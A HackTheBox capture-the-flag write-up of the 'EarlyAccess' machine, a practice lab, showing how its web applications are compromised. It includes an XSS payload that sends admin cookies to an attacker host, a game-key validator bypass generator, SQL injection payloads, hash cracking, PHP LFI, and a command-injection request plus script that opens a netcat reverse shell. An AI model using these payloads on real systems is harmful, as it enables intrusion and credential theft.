# EarlyAccess - HackTheBox - Writeup
Linux, 40 Base Points, Hard

![info.JPG](images/info.JPG)

## Machine

![‏‏EarlyAccess.JPG](images/EarlyAccess.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22```, ```80``` and ```443```.

***User 1***: By login to the system we found XSS on ```Name``` field on the Profile page, Using that, we steal the ```admin``` user ```Cookie```. Using the admin ```Cookie``` we found ```backup.zip``` file which contains ```validate.py``` script which verifies the game key, Write bypass validator to generate our game key to be able to login to ```game``` subdomain, From ```game``` subdomain we found SQL Injection, Fetch from the tables the ```admin``` password to ```dev``` subdomain, From ```dev``` subdomain we found LFI, On the file ```hash.php``` we found Command Injection and we get a reverse shell as ```www-adm``` user. 

***User 2***: By enumerating we found API run on port 5000, and on ```www-adm``` directory we found a file ```.wgetrc``` which contains the API credentials, Using the API we access to ```check_db``` endpoint and fetch the password of ```drew``` user.

***Root***: By reading ```drew``` mails we found a hint, Found also SSH key of ```game-tester@game-server``` on ```drew``` directory, Using the SSH key we access the container which found by enumerating as ```game-tester``` user, Inside the container we found ```entrypoint.sh``` file which runs all the scripts inside ```/docker-entrypoint.d/``` directory as ```root```, Using that we create a ```/bin/sh``` with SUID.

![pwn.JPG](images/pwn.JPG)


## EarlyAccess Solution

### User 1

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ nmap -sV -sC -oA nmap/EarlyAccess 10.10.11.110
Starting Nmap 7.80 ( https://nmap.org ) at 2021-12-06 22:31 IST
Nmap scan report for 10.10.11.110
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e4:66:28:8e:d0:bd:f3:1d:f1:8d:44:e9:14:1d:9c:64 (RSA)
|   256 b3:a8:f4:49:7a:03:79:d3:5a:13:94:24:9b:6a:d1:bd (ECDSA)
|_  256 e9:aa:ae:59:4a:37:49:a6:5a:2a:32:1d:79:26:ed:bb (ED25519)
80/tcp  open  http     Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Did not follow redirect to https://earlyaccess.htb/
443/tcp open  ssl/http Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: EarlyAccess
| ssl-cert: Subject: commonName=earlyaccess.htb/organizationName=EarlyAccess Studios/stateOrProvinceName=Vienna/countryName=AT
| Not valid before: 2021-08-18T14:46:57
|_Not valid after:  2022-08-18T14:46:57
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: Host: 172.18.0.102; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Let's add ```earlyaccess.htb``` to hosts file and browse to [https://earlyaccess.htb/](https://earlyaccess.htb/):

![port443.JPG](images/port443.JPG)

Let's register by clicking on [Register](https://earlyaccess.htb/register):

![register.JPG](images/register.JPG)

Now, Let's [Login](https://earlyaccess.htb/login):

![login.JPG](images/login.JPG)

And we are on the home page:

![home.JPG](images/home.JPG)

By click on Messaging we can see the [Contant Us](https://earlyaccess.htb/contact):

![contact.JPG](images/contact.JPG)

And by clicking on ```Send``` we get the following message:

![contactadmin.JPG](images/contactadmin.JPG)

As we can see, In a couple of minutes the message will be read by the admin.

By research the portal we found the ```name``` field on [Profile](https://earlyaccess.htb/user/profile) is vulnrable to [XSS](https://owasp.org/www-community/attacks/xss/):

![namexss.JPG](images/namexss.JPG)

Let's use it to get the ```admin``` cookies, Set the name to ```evyatar9<script src="https://10.10.14.14:4443/cookies.js" />``` where ```cookies.js``` is:

```javascript
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
httpGet("https://10.10.14.14:4443/"+document.cookie);
```

Now, Let's create a http server:
```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ sudo php -S 0.0.0.0:9000
[Sun Dec 12 22:20:25 2021] PHP 7.4.5 Development Server (http://0.0.0.0:9000) started
```

Next, By sending again message on [Contant Us](https://earlyaccess.htb/contact) page, we get the following request:
```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ sudo php -S 0.0.0.0:9000
[Sun Dec 12 22:20:25 2021] PHP 7.4.5 Development Server (http://0.0.0.0:9000) started
[Sun Dec 12 22:21:07 2021] 10.10.11.110:39980 Accepted
[Sun Dec 12 22:21:07 2021] 10.10.11.110:39980 Invalid request (Unsupported SSL request)
[Sun Dec 12 22:21:07 2021] 10.10.11.110:39980 Closing
[Sun Dec 12 22:21:07 2021] 10.10.11.110:39984 Accepted

```

Meaning that we need to support SSL requests, We can solve it by using the following [python https server](https://gist.github.com/stephenbradshaw/a2b72b5b58c93ca74b54f7747f18a481):
```python
#!/usr/bin/env python3
# python3 update of https://gist.github.com/dergachev/7028596
# Create a basic certificate using openssl: 
#     openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# Or to set CN, SAN and/or create a cert signed by your own root CA: https://thegreycorner.com/pentesting_stuff/writeups/selfsignedcert.html

import http.server
import ssl

httpd = http.server.HTTPServer(('0.0.0.0', 4443), http.server.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
```

Run it, Send again message on [Contant Us](https://earlyaccess.htb/contact) and we get the ```admin``` cookies:
```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ python3 server.py 
10.10.11.110 - - [12/Dec/2021 22:34:08] "GET /cookies.js HTTP/1.1" 200 -
10.10.11.110 - - [12/Dec/2021 22:34:18] code 404, message File not found
10.10.11.110 - - [12/Dec/2021 22:34:18] "GET /XSRF-TOKEN=eyJpdiI6IjcwY1dmamtFaFkyUHA3MkVBYlNOeXc9PSIsInZhbHVlIjoiT3h4d2wvNmZjbGNZQkMrckdGMTh0ZEl5eXFLQmo2bzRJb1RGWTJhTmFKZnZuUFh5Rmt4cGRna1A0YnYyQUc0cStYVnVzUmhHQUtGRE5PL1MzODgrU0tOT3Z1eVBuZFVtbUc1Ni9zdGZJRzkvOE9SSHIvVEZWSTBOL2NZM1NlM0IiLCJtYWMiOiJjNGM0NWNkY2IzMWM5ODY5MzI3Yjk0MzUyZWNmNzQwYzUwYjc1ODY5YjYyMzc3YmJmNmM0ZDYxNjJiNTIyYzhmIn0%3D;%20earlyaccess_session=eyJpdiI6InNqcGZnUHYrUURBckVqVUNVYW9ob2c9PSIsInZhbHVlIjoiTFNReG9iNVhMNVVLbEJGUGZCcUtnUFYrUHAzNllPWm1HaGVSYkh0VEUxMEJLbUQ2V0orYktkTmR6clNFS21aMDlHK2tHNjRlUTNkUTNJU0poVHorM2N0UklDb1B5Yk5INk5pL2dhK2h2em9vUS9yQkU3ak1EWi8xWWtma2VQdjQiLCJtYWMiOiJmNzYzOTNmZTQzNmY5ZTEyOTAwYWU0MjNiNDE1ODM1MWNhYWVhMTc0NWU1OTFiMDg4OGRkNDZmZDI3MWVjM2RmIn0%3D HTTP/1.1" 404 -
```

Let's use those cookies to log in as admin:

![admin.JPG](images/admin.JPG)


On [Admin Page](https://earlyaccess.htb/admin/backup) we can see ```Offline Key-validator```, Let's [download](https://earlyaccess.htb/admin/backup/download) it.

Let's unzip the file:
```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ unzip backup.zip 
Archive:  backup.zip
  inflating: validate.py 
```

By observing ```validate.py``` we can see the key validation code:

```python
#!/usr/bin/env python3
import sys
from re import match

class Key:
    key = ""
    magic_value = "XP" # Static (same on API)
    magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)

    def __init__(self, key:str, magic_num:int=346):
        self.key = key
        if magic_num != 0:
            self.magic_num = magic_num

    @staticmethod
    def info() -> str:
        return f"""
        # Game-Key validator #

        Can be used to quickly verify a user's game key, when the API is down (again).

        Keys look like the following:
        AAAAA-BBBBB-CCCC1-DDDDD-1234

        Usage: {sys.argv[0]} <game-key>"""

    def valid_format(self) -> bool:
        return bool(match(r"^[A-Z0-9]{5}(-[A-Z0-9]{5})(-[A-Z]{4}[0-9])(-[A-Z0-9]{5})(-[0-9]{1,5})$", self.key))

    def calc_cs(self) -> int:
        gs = self.key.split('-')[:-1]
        return sum([sum(bytearray(g.encode())) for g in gs])

    def g1_valid(self) -> bool:
        g1 = self.key.split('-')[0]
        r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
        if r != [221, 81, 145]:
            return False
        for v in g1[3:]:
            try:
                int(v)
            except:
                return False
        return len(set(g1)) == len(g1)

    def g2_valid(self) -> bool:
        g2 = self.key.split('-')[1]
        p1 = g2[::2]
        p2 = g2[1::2]
        return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))

    def g3_valid(self) -> bool:
        # TODO: Add mechanism to sync magic_num with API
        g3 = self.key.split('-')[2]
        if g3[0:2] == self.magic_value: # "346"
            return sum(bytearray(g3.encode())) == self.magic_num
        else:
            return False

    def g4_valid(self) -> bool:
        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]

    def cs_valid(self) -> bool:
        cs = int(self.key.split('-')[-1])
        return self.calc_cs() == cs

    def check(self) -> bool:
        if not self.valid_format():
            print('Key format invalid!')
            return False
        if not self.g1_valid():
            return False
        if not self.g2_valid():
            return False
        if not self.g3_valid():
            return False
        if not self.g4_valid():
            return False
        if not self.cs_valid():
            print('[Critical] Checksum verification failed!')
            return False
        return True

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(Key.info())
        sys.exit(-1)
    input = sys.argv[1]
    validator = Key(input)
    if validator.check():
        print(f"Entered key is valid!")
    else:
        print(f"Entered key is invalid!") 
```

First, The code calls to ```validator.check()``` method which call first to ```g1_valid()```:
```python
def g1_valid(self) -> bool:
        g1 = self.key.split('-')[0]
        r = [(ord(v)<<i+1)%256^ord(v) for i, v in enumerate(g1[0:3])]
        if r != [221, 81, 145]:
            return False
        for v in g1[3:]:
            try:
                int(v)
            except:
                return False
        return len(set(g1)) == len(g1)
```

We need to find the first ```3``` characters which the calculate of ```r``` returns ```[221, 81, 145]```, Then we need another two random numbers, Let's create the following function to create group 1:

```python
import string

def create_g1() -> str:
    first_three_bytes=[221, 81, 145]
    g1_res=""
    i=0
    for b in first_three_bytes:
        for c in [x for x in string.ascii_uppercase+string.digits]:
            if (ord(c)<<i+1)%256^ord(c) == b:
                g1_res+=c
        i+=1
    g1_res+="10"

    return g1_res+"-"

print(create_g1())
```
 
By running it we get the first group: ```KEY10```.

NOTE: We can solve it also using [z3-solver], as follow:
```python
from z3 import *
import string

# Designate the desired output
desiredOutput = [221, 81, 145]

# Designate the input z3 will have control of
inp = []
length=len(desiredOutput)

for i in [x for x in string.ascii_uppercase+string.digits]:
    byte = BitVec("%s" % i, 8)
    inp.append(byte)

z = Solver()

for i in range(length):
    z.add(((inp[i]<<i+1)%256^inp[i]) == desiredOutput[i])


#Check if z3 can solve it, and if it can print out the solution
if z.check() == sat:
    solution = z.model()
    flag = ""
    for i in range(0, length):
        flag += chr(int(str(solution[inp[i]])))
    print(f'The password is: {flag}')

#Check if z3 can't solve it
elif z.check() == unsat:
    print("Condition is not satisfied")

```

But let's write our code to solve it instead.

Next, group ```2``` was validated by:
```python
def g2_valid(self) -> bool:
    g2 = self.key.split('-')[1]
    p1 = g2[::2]
    p2 = g2[1::2]
    return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))
```

So we calculate it by the following code:
```python
def create_g2() -> str:
    part1 = "000"

    sum_part1=sum(bytearray(part1.encode()))
    print(sum_part1)
    res=""
    opt=[x for x in string.ascii_uppercase+string.digits]

    for i in opt:
        for j in opt:
            res=i+j
            if sum(bytearray(res.encode())) == sum_part1:
                return ''.join(["0",res[0],"0",res[1],"0"])+"-"
            res=""

print(create_g1()+create_g2())
```

By running it we get: ```KEY10-0A0O0```.

Next, group ```3``` was validated by:
```python
def g3_valid(self) -> bool:
        # TODO: Add mechanism to sync magic_num with API
        g3 = self.key.split('-')[2]
        if g3[0:2] == self.magic_value: # "XP"
            return sum(bytearray(g3.encode())) == self.magic_num
        else:
            return False
```

We need the first 2 characters will be ```XP``` and the sum of all 5 characters will be ```346``` (the ```magic_num```), Because we see on the comment the API generates ```magic_num``` every 30min we need to generate all the options:
```python
def create_g3() -> str:
    magic_value="XP"
    magic_num=178 # 178 is the minimum magic_num because the first option for the last three characters is "AA0"
    sum_part1=sum(bytearray(magic_value.encode()))

    for i in [x for x in string.ascii_uppercase]: # 4 first char are upper case
        for j in [x for x in string.ascii_uppercase]:
            for k in [x for x in string.digits]: # last char is digit
                part_2=i+j+str(k)
                if sum(bytearray(part_2.encode())) > magic_num:
                    g3=magic_value+part_2+"-"
                    key_wo_group4=create_g1()+create_g2()+g3+create_g4(create_g1())
                    final_key=key_wo_group4+create_g5(key_wo_group4)
                    print(final_key)
                    magic_num+=1


```

We cannot run it yet until ```create_g4``` and ```create_g5``` are not ready.

Next, group ```4``` was validated by:
```python
def g4_valid(self) -> bool:
        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]
```

If Group 1 is ```KEY10``` and let's say Group 4 is ```ABCDE``` so [python zip](https://www.programiz.com/python-programming/methods/built-in/zip) will return ```[('K', 'A'), ('E', 'B'), ('Y', 'C'), ('1', 'D'), ('0', 'E')]```, and then we need the XOR result for each sub group will be ```[12, 4, 20, 117, 0]```:
```python
def create_g4(g1) -> str:
    res = [12, 4, 20, 117, 0]
   
    opt=[x for x in string.ascii_uppercase+string.digits]
    g1=g1.split('-')[0]
    print(g1)
    g4_res=""
    i=0
    for g in g1:
        for c in opt:
            if ord(g) ^ ord(c) == res[i]:
               g4_res+=c
               i+=1
               break

    print(i)
    return g4_res+"-"

print(create_g1()+create_g2()+create_g3()+create_g4(create_g1()))
```

By running it we get: ```KEY10-0A0O0-XPAA0-GAMD0-```.

The last group was validated by:
```python
def calc_cs(self) -> int:
    gs = self.key.split('-')[:-1]
    return sum([sum(bytearray(g.encode())) for g in gs])
		
def cs_valid(self) -> bool:
    cs = int(self.key.split('-')[-1])
    return self.calc_cs() == cs
```

Finally, the last group is like a checksum of the key, ```calc_cs(key)``` will return ```1293``` so the last part should be ```1293```:
```python
def create_g5(key) -> str:
    gs=key.split('-')[:-1]
    checksum=sum([sum(bytearray(g.encode())) for g in gs])
    return str(checksum)
```

Let's write all together:
```python
import string

def create_g1() -> str:
    first_three_bytes=[221, 81, 145]
    g1_res=""
    i=0
    for b in first_three_bytes:
        for c in [x for x in string.ascii_uppercase+string.digits]:
            if (ord(c)<<i+1)%256^ord(c) == b:
                g1_res+=c
        i+=1
    g1_res+="10"

    return g1_res+"-"

def create_g2() -> str:
    part1 = "000"
    magic_value=346

    sum_part1=sum(bytearray(part1.encode()))
    res=""
    opt=[x for x in string.ascii_uppercase+string.digits]

    for i in opt:
        for j in opt:
            res=i+j
            if sum(bytearray(res.encode())) == sum_part1:
                return ''.join(["0",res[0],"0",res[1],"0"])+"-"
            res=""


def create_g4(g1) -> str:
    res = [12, 4, 20, 117, 0]
   
    opt=[x for x in string.ascii_uppercase+string.digits]
    g1=g1.split('-')[0]
    g4_res=""
    i=0
    for g in g1:
        for c in opt:
            if ord(g) ^ ord(c) == res[i]:
               g4_res+=c
               i+=1
               break

    return g4_res+"-"

def create_g5(key) -> str:
    gs=key.split('-')[:-1]
    checksum=sum([sum(bytearray(g.encode())) for g in gs])
    return str(checksum)

def create_g3() -> str:
    magic_value="XP"
    magic_num=178 # 178 is the minimum magic_num because the first option for the last three characters is "AA0"
    sum_part1=sum(bytearray(magic_value.encode()))

    for i in [x for x in string.ascii_uppercase]: # 4 first char are upper case
        for j in [x for x in string.ascii_uppercase]:
            for k in [x for x in string.digits]: # last char is digit
                part_2=i+j+str(k)
                if sum(bytearray(part_2.encode())) > magic_num:
                    g3=magic_value+part_2+"-"
                    key_wo_group4=create_g1()+create_g2()+g3+create_g4(create_g1())
                    final_key=key_wo_group4+create_g5(key_wo_group4)
                    print(final_key)
                    magic_num+=1

def create_final_key():
    create_g3()
```

So by running this we get a list of optional keys.

Now, We need to check each key against the validator API, Let's do it using the following script:
```python
import requests
from bs4 import BeautifulSoup as bs

cookies={'XSRF-TOKEN':'eyJpdiI6InpzNDNCc21iOGVXQ0lHN3pJVGsrZ1E9PSIsInZhbHVlIjoiTUJhYWJvdWtBS3RyL3p6eFF4cHJFRUVrakZUVHoySG9xMW14eDcrRDRtd21BcTQzWnFZSUlhYXFKT0lpWGtXNHNBaGxwcVNBZmZ0cDZwU016cXpKa2k2SW1jS2ttTGU2dzNZYmJyby9oTGoyclJsQUxTbWxvRFRlTHlmaW9YOSsiLCJtYWMiOiJhNzZmNjFmOWNjMjlhZTQ0Yzk5Zjk4ZmQ0YTBlYzc4OTczNWI0NmFmNWM1YzgyYmY1NTA4NjQ1Mjg5ZGZmZGFlIn0%3D','earlyaccess_session':'eyJpdiI6ImtIR0NxWTJVbzNLZXphdzV4VUZYeFE9PSIsInZhbHVlIjoiQUxlZE5LTUxnMGh4bmpET3pjbVk0ZGxEdHNZQnVjRVZQTlBJTmRBTWM0Sm1SNjhmUVBsWHl1TUpLaEIvSmcwYitreFZreW83UFRmNzN4bmVvZG04N0VTcmpzYVVZb2tmZEYzaHhFSk1yZGM0SHhhdlFnem43ZUNxaGM3dlUrYkMiLCJtYWMiOiI4NTdkNWJmZWNhN2MxNGExMTU5MWQ2ZTJhOTZmYTMwZmE1ZmQ3YTM3MzEyNzY3OWZhZjdmMzFjODFlM2RjZWE5In0%3D'}

def get_csrf_token(html_content) ->str ():
    soup = bs(html_content)
    csrf_element = soup.find_all(attrs={"name" : "csrf-token"})
    csrf_token= csrf_element[0]['content']
    
    return csrf_token

def fetch_csrf_token() -> str():
    r = requests.get("https://earlyaccess.htb/key",cookies=cookies, verify=False)
    response = r.content
    return get_csrf_token(response)


def fuzz_token():
    _token=fetch_csrf_token()
    with open('./keys.txt','r') as f:
        keys = f.readlines()
        for key in keys:
            r = requests.post("https://earlyaccess.htb/key/add", data={'_token':_token,'key':key},cookies=cookies, verify=False)
            content=r.content
            #print(content)
            if b"Game-key is invalid!" not in content:
                print(f"Found key: {key}")
                break
            _token=get_csrf_token(content)

fuzz_token()

```

Run it:
```python
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ python3 fuzz_key.py
Found key: KEY10-0A0O0-XPHZ9-GAMD0-1334
```


And we found the key:

![finalkey.JPG](images/finalkey.JPG)

By trying to log in to [http://game.earlyaccess.htb](http://game.earlyaccess.htb) before we set the key we get:

![gamebefore.JPG](images/gamebefore.JPG)

But now when we have the key we can log in to the game portal and play Snake:

![gameafter.JPG](images/gameafter.JPG)

When we are played a few games and browse to [http://game.earlyaccess.htb/scoreboard.php](http://game.earlyaccess.htb/scoreboard.php) we can see the following list:

![scoreboard.JPG](images/scoreboard.JPG)

We can see our username on the scoreboard, After research, we found that we can achieve [SQL Injection](https://portswigger.net/web-security/sql-injection) by changing our username to SQLI payload.

By trying the first payload ```' OR 1=1--``` we get:

![sqli1.JPG](images/sqli1.JPG)

We can see ```...the right syntax to use near '') ORDER BY score...``` meaing that we need ```')``` in our query, Let's try the following payload ```test') or 1=1 UNION SELECT 1,USER(),3 -- -```:

![sqli2.JPG](images/sqli2.JPG)

And we successfully get the result of ```USER()```.

By sending this payload  ```test') or 1=1 UNION SELECT 1,(SELECT table_name FROM information_schema.tables LIMIT 2,1),3 -- -``` we get table name ```users```:

![sqli3.JPG](images/sqli3.JPG)

By sending this payload: ```test') or 1=1 UNION SELECT 1,(SELECT password FROM users LIMIT 1),3 -- -``` We get the first password from the table (which we can guess it's the admin password):

![sqli4.JPG](images/sqli4.JPG)

Let's try to crack the hash ```618292e936625aca8df61d5fff5c06837c49e491``` using ```john```:
```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ john --wordlist=~/Desktop/rockyou.txt hash
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
gameover         (?)
1g 0:00:00:00 DONE (2021-12-18 01:43) 6.250g/s 41150p/s 41150c/s 41150C/s john..ellie1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed

```

And we get the password ```gameover```, We can use this password to log in to [http://dev.earlyaccess.htb](http://dev.earlyaccess.htb):

![admindev.JPG](images/admindev.JPG)

By clicking on [Hashing-Tools](http://dev.earlyaccess.htb/home.php?tool=hashing) we get:

![hashing.JPG](images/hashing.JPG)


And by clicking on [File-Tools](http://dev.earlyaccess.htb/home.php?tool=file) we get:

![filetools.JPG](images/filetools.JPG)

Using [gobuster](https://github.com/OJ/gobuster) we found the following pages:
```console
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.earlyaccess.htb
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/12/18 02:29:53 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 327] [--> http://dev.earlyaccess.htb/assets/]
/home.php             (Status: 302) [Size: 4426] [--> /index.php]                       
/includes             (Status: 301) [Size: 329] [--> http://dev.earlyaccess.htb/includes/]
/index.php            (Status: 200) [Size: 2685]                                          
/actions              (Status: 301) [Size: 328] [--> http://dev.earlyaccess.htb/actions/] 
/actions/hash.php     (Status: 301) [Size: 328] [--> http://dev.earlyaccess.htb/actions/hash.php] 
/actions/file.php     (Status: 301) [Size: 328] [--> http://dev.earlyaccess.htb/actions/file.php] 
/server-status        (Status: 403) [Size: 284]                                           
/hashing.php          (Status: 200) [Size: 2974]    
``

Let's try to fuzz the parameters of [http://dev.earlyaccess.htb/actions/file.php](http://dev.earlyaccess.htb/actions/file.php) using ```wfuzz``` with this [wordlist](https://github.com/danielmiessler/SecLists/blob/285474cf9bff85f3323c5a1ae436f78acd1cb62c/Discovery/Web-Content/burp-parameter-names.txt):
```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ wfuzz -w ./burp-parameter-names.txt http://dev.earlyaccess.htb/actions/file.php?FUZZ=/etc/passwd
===================================================================
ID           Response   Lines    Word     Chars       Payload                             
===================================================================

000000001:   500        0 L      3 W      35 Ch       "id"                                
000000007:   500        0 L      3 W      35 Ch       "email"                             
000000009:   500        0 L      3 W      35 Ch       "username"                          
000000004:   500        0 L      3 W      35 Ch       "name"                              
000000005:   500        0 L      3 W      35 Ch       "password"                          
000000006:   500        0 L      3 W      35 Ch       "url"           
...
```

And we found the following parameter:
```console
000001316:   500        0 L      10 W     89 Ch       "filepath" 
```
 
Let's try to use it [http://dev.earlyaccess.htb/actions/file.php?filepath=/etc/passwd](http://dev.earlyaccess.htb/actions/file.php?filepath=/etc/passwd):

![filepath1.JPG](images/filepath1.JPG)

And if we are trying to get [http://dev.earlyaccess.htb/actions/file.php?filepath=file.php](http://dev.earlyaccess.htb/actions/file.php?filepath=file.php) we get:

![filepath2.JPG](images/filepath2.JPG)

And if we are trying to read [http://dev.earlyaccess.htb/actions/file.php?filepath=hash.php](http://dev.earlyaccess.htb/actions/file.php?filepath=hash.php) we get:

![filepath3.JPG](images/filepath3.JPG)

Let's try to read the ```hash.php``` content using ```php://filter``` wrapper: [http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php](http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php):

![filepath4.JPG](images/filepath4.JPG)

And we are successfully read the file ```hash.php```, By decoding the base64 we get:
```php
<?php
include_once "../includes/session.php";

function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}

try
{
    if(isset($_REQUEST['action']))
    {
        if($_REQUEST['action'] === "verify")
        {
            // VERIFIES $password AGAINST $hash

            if(isset($_REQUEST['hash_function']) && isset($_REQUEST['hash']) && isset($_REQUEST['password']))
            {
                // Only allow custom hashes, if `debug` is set
                if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
                    throw new Exception("Only MD5 and SHA1 are currently supported!");

                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);

                $_SESSION['verify'] = ($hash === $_REQUEST['hash']);
                header('Location: /home.php?tool=hashing');
                return;
            }
        }
        elseif($_REQUEST['action'] === "verify_file")
        {
            //TODO: IMPLEMENT FILE VERIFICATION
        }
        elseif($_REQUEST['action'] === "hash_file")
        {
            //TODO: IMPLEMENT FILE-HASHING
        }
        elseif($_REQUEST['action'] === "hash")
        {
            // HASHES $password USING $hash_function

            if(isset($_REQUEST['hash_function']) && isset($_REQUEST['password']))
            {
                // Only allow custom hashes, if `debug` is set
                if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
                    throw new Exception("Only MD5 and SHA1 are currently supported!");

                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
                if(!isset($_REQUEST['redirect']))
                {
                    echo "Result for Hash-function (" . $_REQUEST['hash_function'] . ") and password (" . $_REQUEST['password'] . "):<br>";
                    echo '<br>' . $hash;
                    return;
                }
                else
                {
                    $_SESSION['hash'] = $hash;
                    header('Location: /home.php?tool=hashing');
                    return;
                }
            }
        }
    }
    // Action not set, ignore
    throw new Exception("");
}
catch(Exception $ex)
{
    if($ex->getMessage() !== "")
        $_SESSION['error'] = htmlentities($ex->getMessage());

    header('Location: /home.php');
    return;
}
?>
```

Let's observe the function ```hash_pw```:
```php
function hash_pw($hash_function, $password)
{
    // DEVELOPER-NOTE: There has gotta be an easier way...
    ob_start();
    // Use inputted hash_function to hash password
    $hash = @$hash_function($password);
    ob_end_clean();
    return $hash;
}
```

As we can see, It's calling to ```hash_function``` custom function with ```password``` as a parameter, We can control on ```hash_function```:
```php
...
// Only allow custom hashes, if `debug` is set
if($_REQUEST['hash_function'] !== "md5" && $_REQUEST['hash_function'] !== "sha1" && !isset($_REQUEST['debug']))
    throw new Exception("Only MD5 and SHA1 are currently supported!");

$hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);
...

```

If we set the parameter ```debug``` we can choose our custom hash which will be the function that ```hash_pw``` run, Let's try it:
```HTTP
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://dev.earlyaccess.htb
DNT: 1
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: PHPSESSID=94ae111e9cbc7a12441bb5145cab7c6
Upgrade-Insecure-Requests: 1

action=hash&redirect=true&password=ls&hash_function=system&debug=true

```

We just add the parameter ```debug``` and choose to run the function ```system``` with ```ls``` and we get:

![hashrce1.JPG](images/hashrce1.JPG)

Now, By sending this request:
```http
POST /actions/hash.php HTTP/1.1
Host: dev.earlyaccess.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 93
Origin: http://dev.earlyaccess.htb
DNT: 1
Connection: close
Referer: http://dev.earlyaccess.htb/home.php?tool=hashing
Cookie: PHPSESSID=94ae111e9cbc7a7a3d41bb7a45cab7c6
Upgrade-Insecure-Requests: 1

action=hash&redirect=true&password=nc+10.10.14.14+4242+-e+/bin/bash&hash_function=system&debug
```

Let's create a script to do it automatically:
```python
import requests
import sys

def login():
    req_body={'password':'gameover'}
    r = requests.get("http://dev.earlyaccess.htb/actions/login.php",cookies={'PHPSESSID':'94ae111e9cbc7a7a3d41bb7a45cab7c6'},data=req_body,headers={'Content-Type':'application/x-www-form-urlencoded'})

def call_hash_function(ip,port):
    req_body=f'action=hash&redirect=true&password=nc+{ip}+{port}+-e+/bin/bash&hash_function=system&debug'
    requests.post('http://dev.earlyaccess.htb/actions/hash.php',cookies={'PHPSESSID':'94ae111e9cbc7a7a3d41bb7a45cab7c6'}, data=req_body,headers={'Content-Type':'application/x-www-form-urlencoded'})

def get_rev_shell(ip,port):
    login()
    call_hash_function(ip,port)
 
if len(sys.argv) < 3:
    print("Usage: python dev_revshell.py <IP> <PORT>")

ip = sys.argv[1]
port = sys.argv[2]

get_rev_shell(ip,port)

```

By running it we get a reverse shell as ```www-data``` user:
```console
┌─[evyatar@parrot]─[/hackthebox/EarlyAccess]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
connect to [10.10.14.14] from earlyaccess.htb [10.10.11.110] 46754
whoami
www-data
````

